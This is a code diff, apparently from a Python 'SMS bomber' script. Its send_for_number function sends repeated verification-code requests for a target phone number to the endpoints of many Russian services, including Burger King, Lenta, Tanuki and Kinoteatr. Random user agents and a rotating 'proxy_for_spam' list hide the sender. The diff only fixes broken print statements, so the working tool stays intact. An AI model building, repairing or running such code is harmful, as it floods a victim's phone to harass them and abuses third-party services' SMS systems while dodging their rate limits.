@@ -363,13 +363,11 @@ def send_for_number(phone):
 	try:
 		requests.post('https://cash-u.com/main/rest/firstrequest/phone/confirmation/send', data = {phone_format(phone, 'X (XXX) XXX-XX-XX'): ''},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
 		print('+')
-	print('+')
 	except:
 	    print('-')
 	try:
 		requests.post('https://www.tanuki.ru/sendCode/', json = {"phone":phone_format(phone, "(+X)XXXXXXXXXX"),"smsType":2,"headers":{"version":"2.0","userId":"666ebf12-9cd5-ed2f-a7c9-67f3a8d99ab1","debugMode":True,"agent":{"device":"mobile","version":"undefined undefined"},"dbgValue":"","langId":"1","cityId":"1"}},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
 		print('+')
-	print('+')
 	except:
 	    print('-')
 	try:
@@ -381,30 +379,26 @@ def send_for_number(phone):
 	try:
 		requests.get('https://app.taxsee.com/send-link/?intl=ru-RU&phone=%2B' + phone_format(phone, 'XXX(XX)XXX-XX-XX'),headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
 		print('+')
-	print('+')
 	except:
 	    print('-')
 	try:
 		requests.post('https://app.burgerking.ru/bridge/auth/index', json = {'phone': "+" + phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
 		print('+')
-	print('+')
 	except:
 	    print('-')
 	try:
 		requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
 		print('+')
-	print('+')
 	except:
 	    print('-')
 	try:
 		requests.post("https://www.gloria-jeans.ru/phone-verification/send-code/registration", json={"phoneNumber": "+" + phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
 		print('+')
-	print('+')
 	except:
 	    print('-')
 	try:
 		requests.post("https://kinoteatr.ru/cgi-bin/api.pl",json={"method": "SendSMSToConfirmPhone","params": {"Phone": phone[1:]}},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	print('+')
+	    print('+')
 	except:
 	    print('-')
 	try:
